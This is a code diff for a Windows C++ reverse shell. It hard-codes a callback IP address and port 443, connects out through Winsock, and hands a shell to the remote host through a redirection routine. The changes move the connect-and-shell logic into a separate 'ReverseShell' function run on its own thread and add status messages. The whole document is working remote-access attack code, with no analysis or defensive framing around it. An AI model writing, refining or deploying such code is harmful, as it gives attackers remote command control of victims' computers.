@@ -3,13 +3,16 @@
 #include <ws2tcpip.h>
 #include <windows.h>
 #include <string>
+#include <thread>  // For multi-threading support
+#include <atomic>  // For atomic flags
+#include <chrono>  // For time management
 
 #pragma comment(lib, "Ws2_32.lib")
 
 #define DEFAULT_BUFLEN 1024
 
 // Static IP and port values
-const std::string SERVER_IP = "192.168.25.22";  // Replace with the desired static IP
+const std::string SERVER_IP = "192.168.45.219";  // Replace with the desired static IP
 const int SERVER_PORT = 443;                    // Replace with the desired static port
 
 int InitializeWinsock() {
@@ -79,28 +82,40 @@ void SetupRedirection(SOCKET clientSocket) {
     CloseHandle(pi.hThread);
 }
 
-int main() {
-    // Removed command-line arguments; using static values for IP and port
-    if (InitializeWinsock() != 0) {
-        return -1;
-    }
-
+void ReverseShell() {
     SOCKET clientSocket = CreateSocket();
     if (clientSocket == INVALID_SOCKET) {
         WSACleanup();
-        return -1;
+        return;
     }
 
+    std::cout << "Attempting to connect to the server..." << std::endl;
     if (!ConnectToServer(clientSocket)) {
+        std::cerr << "Failed to connect to the server!" << std::endl;
         closesocket(clientSocket);
         WSACleanup();
-        return -1;
+        return;
     }
 
+    std::cout << "Connection established. Starting reverse shell..." << std::endl;
     SetupRedirection(clientSocket);
 
     closesocket(clientSocket);  // Clean up after the shell exits
     WSACleanup();               // Cleanup Winsock
+}
+
+int main() {
+    if (InitializeWinsock() != 0) {
+        return -1;
+    }
+
+    // Launch reverse shell in a new thread to make it independent
+    std::thread reverseShellThread(ReverseShell);
+
+    // Wait for the reverse shell thread to complete to ensure it's working
+    reverseShellThread.join();
+
+    std::cout << "Reverse shell has completed." << std::endl;
 
     return 0;
 }
